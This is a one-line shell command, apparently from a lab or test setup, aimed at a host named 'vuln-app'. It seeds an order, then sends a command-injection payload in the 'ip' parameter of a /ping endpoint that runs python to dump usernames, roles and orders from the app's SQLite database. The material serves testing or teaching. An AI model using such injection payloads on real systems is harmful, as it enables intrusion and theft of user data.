command: set -eu; curl -s -H 'Content-Type: application/json' -d '{"customer":"seed","item":"sku-001","quantity":1}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import json,sqlite3; conn=sqlite3.connect('/app/data/app.db'); data={'users': conn.execute('select username,role from users order by username').fetchall(), 'orders': conn.execute('select customer,item,quantity from orders order by id desc limit 5').fetchall()}; print(json.dumps(data, default=list))\"" >/dev/null; sleep 2
